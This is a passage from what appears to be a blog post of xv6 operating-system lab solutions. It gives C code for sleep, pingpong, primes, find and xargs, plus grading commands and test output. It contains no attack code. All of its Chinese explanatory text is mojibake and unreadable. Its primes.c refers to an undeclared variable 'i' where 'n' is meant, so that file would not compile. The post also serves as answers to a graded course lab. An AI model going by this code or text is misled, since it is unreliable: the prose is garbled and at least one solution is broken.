qemu</p><p><strong>ç»“è®ºï¼šåšä»»ä½•äº‹ä¹‹å‰å…ˆçœ‹ä»‹ç»</strong></p><h3 id="æˆç»©æµ‹è¯•"><a href="#æˆç»©æµ‹è¯•" class="headerlink" title="æˆç»©æµ‹è¯•"></a>æˆç»©æµ‹è¯•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æµ‹è¯•æ‰€æœ‰å®éªŒ</span></span><br><span class="line">make grade</span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ‹è¯•ä¸€ä¸ªç¨‹åº</span></span><br><span class="line">./grade-lab-util name</span><br><span class="line"><span class="comment"># æˆ–</span></span><br><span class="line">make GRADEFLAGS=name grade</span><br></pre></td></tr></table></figure><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><p>åœ¨ bash ä¸­æµ‹è¯•ï¼Œèƒ½å¤Ÿå¤šå‚æ•°ä¸”å¦‚æœä¸€ä¸ªå‚æ•°é”™è¯¯å°±ä¸æ‰§è¡Œ</p><figure class="highlight c"><figcaption><span>user/sleep.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">isDigitStr</span><span class="params">(<span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(str[i] &lt; <span class="string">&#x27;0&#x27;</span> || str[i] &gt; <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(argc == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;sleep: missing operand\n&quot;</span>);</span><br><span class="line">        status = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc &amp;&amp; !status; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!isDigitStr(argv[i])) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;sleep: invalid time interval\n&quot;</span>);</span><br><span class="line">            status = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc &amp;&amp; !status; i++) &#123;</span><br><span class="line">        sleep(atoi(argv[i]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æºä»£ç æ”¾åœ¨ <code>user</code> ç›®å½•ä¸‹ï¼Œæ¯æ¬¡å†™å®Œä¸€ä¸ªç¨‹åºåœ¨ Makefile ä¸­çš„ UPROGS ä¸‹æ·»åŠ ä¸€è¡Œ <code>$U/_sleep\</code></p><p>ç„¶å <code>make qemu</code> ç¼–è¯‘è¿è¡Œ</p><p>ä¹‹åå¯ä»¥åœ¨ qemu å¤–è¿è¡Œ <code>/grade-lab-util sleep</code> è¿›è¡Œå•é¡¹æµ‹è¯•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./grade-lab-util <span class="built_in">sleep</span></span><br><span class="line">make: <span class="string">&#x27;kernel/kernel&#x27;</span> is up to <span class="built_in">date</span>.</span><br><span class="line">== Test <span class="built_in">sleep</span>, no arguments == <span class="built_in">sleep</span>, no arguments: OK (1.5s)</span><br><span class="line">== Test <span class="built_in">sleep</span>, returns == <span class="built_in">sleep</span>, returns: OK (0.6s)</span><br><span class="line">== Test <span class="built_in">sleep</span>, makes syscall == <span class="built_in">sleep</span>, makes syscall: OK (1.0s)</span><br></pre></td></tr></table></figure><h2 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h2><p>ç®€å•é¢˜</p><p>çˆ¶è¿›ç¨‹å‘é€å­è¿›ç¨‹ä¸€ä¸ªå­—èŠ‚ï¼Œå­è¿›ç¨‹æ”¶åˆ°åå†ç»™çˆ¶è¿›ç¨‹ä¸€ä¸ªå­—èŠ‚</p><figure class="highlight c"><figcaption><span>user/pingpong.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid, p[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    pipe(p);</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(read(p[<span class="number">0</span>], <span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">            pid = getpid();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d: received ping\n&quot;</span>, pid);</span><br><span class="line">            write(p[<span class="number">1</span>], <span class="string">&quot;L&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        write(p[<span class="number">1</span>], <span class="string">&quot;H&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(read(p[<span class="number">0</span>], <span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">            pid = getpid();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d: received pong\n&quot;</span>, pid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h2><p>æœ‰ç‚¹éš¾åº¦ï¼Œæƒ³äº†å¥½ä¹…ï¼Œæ„Ÿè§‰æ˜¯è¦ç”¨é€’å½’ï¼Œä½†æ˜¯æ²¡æƒ³å‡ºæ¥æ€ä¹ˆå†™</p><p>æƒ³åˆ°åœ¨çœ‹ç½‘è¯¾çš„æ—¶å€™ï¼Œè¿›å…¥å­è¿›ç¨‹å…ˆæŠŠ <code>close(0)</code>ï¼Œç„¶å <code>dup(p[1])</code>ï¼Œä¹Ÿå°±æ˜¯æŠŠå­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥æ”¹ä¸ºç®¡é“çš„è¾“å…¥äº†ï¼Œè¿™æ ·å°±å®¹æ˜“å†™é€’å½’äº†</p><p>æ¯æ¬¡åªè¾“å‡ºæ¥æ”¶åˆ°çš„ç¬¬ä¸€ä¸ªæ•°ï¼Œå®ƒå¿…ç„¶æ˜¯ç´ æ•°</p><p>å½“ä»è¾“å…¥æ¥æ”¶ä¸åˆ° prime çš„æ—¶å€™ <code>exit(0)</code></p><p>è¿™é‡Œæ³¨æ„ <code>dup(p[1])</code> åè¦æŠŠç®¡é“éƒ½ç»™å…³äº†</p><figure class="highlight c"><figcaption><span>user/primes.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printPrime</span><span class="params">(<span class="type">int</span> prime)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">primes</span><span class="params">(<span class="type">int</span> start)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    primes(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printPrime</span><span class="params">(<span class="type">int</span> prime)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prime %d\n&quot;</span>, prime);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">primes</span><span class="params">(<span class="type">int</span> start)</span> &#123;</span><br><span class="line">    <span class="type">int</span> prime = <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> n, pid, p[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!start &amp;&amp; read(<span class="number">0</span>, &amp;prime, <span class="keyword">sizeof</span>(prime)) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    printPrime(prime);</span><br><span class="line"></span><br><span class="line">    pipe(p);</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// p[0] =&gt; stdin</span></span><br><span class="line">        close(<span class="number">0</span>);</span><br><span class="line">        dup(p[<span class="number">0</span>]);</span><br><span class="line">        close(p[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// do not need p[1]</span></span><br><span class="line">        close(p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        primes(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(start == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>; i &lt;= <span class="number">35</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(i % prime != <span class="number">0</span>) &#123;</span><br><span class="line">                    write(p[<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(i));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">while</span>(read(<span class="number">0</span>, &amp;n, <span class="keyword">sizeof</span>(n))) &#123;</span><br><span class="line">                <span class="keyword">if</span>(i % prime != <span class="number">0</span>) &#123;</span><br><span class="line">                    write(p[<span class="number">1</span>], &amp;n, <span class="keyword">sizeof</span>(n));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        close(p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// wait for child process</span></span><br><span class="line">        <span class="type">int</span> status;</span><br><span class="line">        wait(&amp;status);</span><br><span class="line">        <span class="built_in">exit</span>(status);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>åŒæ ·ä¹Ÿæ˜¯é€’å½’ï¼Œä»ç›®å½•é‡ŒæŸ¥æ‰¾æ–‡ä»¶å¯ä»¥å‚è€ƒ <code>./user/ls.c</code></p><p>å½“æ‰¾çš„æ˜¯æ–‡ä»¶æˆ–è€…æ—¶æ¯”è¾ƒåå­—</p><p>å½“æ‰¾çš„æ˜¯ç›®å½•æ—¶ï¼Œä» fd è¯»å– <code>struct dirent[]</code>ï¼Œè¡¨ç¤ºç›®å½•ä¸‹çš„æ¯ä¸ªæ–‡ä»¶ï¼Œé‡Œé¢æœ‰ nameï¼Œè¡¨ç¤ºæ–‡ä»¶åï¼Œæ³¨æ„è¿‡æ»¤ <code>.</code> å’Œ <code>..</code></p><figure class="highlight c"><figcaption><span>user/find.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fcntl.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">char</span> *path, <span class="type">char</span> *filename)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;find: invalid arguments\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> status = find(argv[<span class="number">1</span>], argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(status);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">char</span> *path, <span class="type">char</span> *filename)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">512</span>];</span><br><span class="line">    <span class="type">char</span> *name, *p;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> <span class="title">de</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((fd = open(path, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;find: cannot open %s\n&quot;</span>, path);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fstat(fd, &amp;st) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;find: cannot stat %s\n&quot;</span>, path);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (st.type) &#123;</span><br><span class="line">        <span class="keyword">case</span> T_DEVICE:</span><br><span class="line">        <span class="keyword">case</span> T_FILE:</span><br><span class="line">            name = path;</span><br><span class="line">            <span class="comment">// get position of filename</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="built_in">strlen</span>(path) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">                <span class="keyword">if</span>(path[i] == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                    name = &amp;path[i+<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name, filename)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if path is directory</span></span><br><span class="line">        <span class="keyword">case</span> T_DIR:</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strlen</span>(path)+<span class="number">1</span>+DIRSIZ+<span class="number">1</span> &gt; <span class="keyword">sizeof</span>(buf)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;find: path too long\n&quot;</span>);</span><br><span class="line">                close(fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">strcpy</span>(buf, path);</span><br><span class="line">            p = buf + <span class="built_in">strlen</span>(buf);</span><br><span class="line">            *p++ = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">            <span class="keyword">while</span>(read(fd, &amp;de, <span class="keyword">sizeof</span>(de)) == <span class="keyword">sizeof</span>(de)) &#123;</span><br><span class="line">                <span class="comment">// excpet for &quot;.&quot; and &quot;..&quot;</span></span><br><span class="line">                <span class="keyword">if</span>(de.inum == <span class="number">0</span> || !<span class="built_in">strcmp</span>(de.name, <span class="string">&quot;.&quot;</span>) || !<span class="built_in">strcmp</span>(de.name, <span class="string">&quot;..&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                memmove(p, de.name, DIRSIZ);</span><br><span class="line">                p[DIRSIZ] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                find(buf, filename);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h2><p>ä¸€å¼€å§‹æ²¡æ‡‚ <code>sh</code> æ€ä¹ˆå®ç°ç®¡é“</p><p>æµ‹è¯•å‘ç°å°±æ˜¯å°†ç®¡é“çš„è¯»ç«¯ä½œä¸º <code>|</code> å³è¾¹ç¨‹åºçš„æ ‡å‡†è¾“å…¥</p><p>ä¸»è¦æ˜¯åˆ¤æ–­ä»€ä¹ˆæ—¶å€™è·³å‡ºå¾ªç¯</p><figure class="highlight c"><figcaption><span>user/xargs.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/param.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> status, pid, new_argc;</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf;</span><br><span class="line">    <span class="type">char</span> *new_argv[MAXARG];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; i++) &#123;</span><br><span class="line">        new_argv[i<span class="number">-1</span>] = argv[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(read(<span class="number">0</span>, &amp;buf, <span class="number">1</span>)) &#123;</span><br><span class="line">        new_argc = argc;</span><br><span class="line">        idx = <span class="number">0</span>;</span><br><span class="line">        new_argv[new_argc<span class="number">-1</span>] = (<span class="type">char</span>*)<span class="built_in">malloc</span>(MAXARG);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// only read one line each time</span></span><br><span class="line">            <span class="keyword">if</span>(buf == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">                new_argv[new_argc<span class="number">-1</span>][idx] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                new_argv[new_argc] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(buf == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// if meet &#x27; &#x27;, divide into more argv</span></span><br><span class="line">                <span class="comment">// except for two &#x27; &#x27;</span></span><br><span class="line">                <span class="keyword">if</span>(idx == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                new_argv[new_argc<span class="number">-1</span>][idx] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                new_argc++;</span><br><span class="line">                idx = <span class="number">0</span>;</span><br><span class="line">                new_argv[new_argc<span class="number">-1</span>] = (<span class="type">char</span>*)<span class="built_in">malloc</span>(MAXARG);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            new_argv[new_argc<span class="number">-1</span>][idx++] = buf;</span><br><span class="line">        &#125; <span class="keyword">while</span>(read(<span class="number">0</span>, &amp;buf, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">            exec(new_argv[<span class="number">0</span>], new_argv);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;wrong command\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = argc; i &lt;= new_argc; i++) &#123;</span><br><span class="line">            <span class="built_in">free</span>(new_argv[i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Optional-challenge-exercises"><a href="#Optional-challenge-exercises" class="headerlink" title="Optional challenge exercises"></a>Optional challenge exercises</h2><h3 id="å†™ä¸€ä¸ª-uptime-ç¨‹åºæ¥è°ƒç”¨-uptime-ç³»ç»Ÿè°ƒç”¨"><a href="#å†™ä¸€ä¸ª-uptime-ç¨‹åºæ¥è°ƒç”¨-uptime-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="å†™ä¸€ä¸ª uptime ç¨‹åºæ¥è°ƒç”¨ uptime ç³»ç»Ÿè°ƒç”¨"></a>å†™ä¸€ä¸ª uptime ç¨‹åºæ¥è°ƒç”¨ uptime ç³»ç»Ÿè°ƒç”¨</h3><p>ç›´æ¥è°ƒç”¨ uptime ç„¶åæ‰“å°è¿”å›å€¼å°±å¥½äº†</p><h3 id="å¯¹-grep-å®ç°æ­£åˆ™åŒ¹é…"><a href="#å¯¹-grep-å®ç°æ­£åˆ™åŒ¹é…" class="headerlink" title="å¯¹ grep å®ç°æ­£åˆ™åŒ¹é…"></a>å¯¹ grep å®ç°æ­£åˆ™åŒ¹é…</h3><p>yysyï¼Œå¯¹æ­£åˆ™è¡¨è¾¾å¼ä¸æ˜¯å¾ˆäº†è§£</p><h3 id="æ”¹é€ -sh"><a href="#æ”¹é€ -sh" class="headerlink" 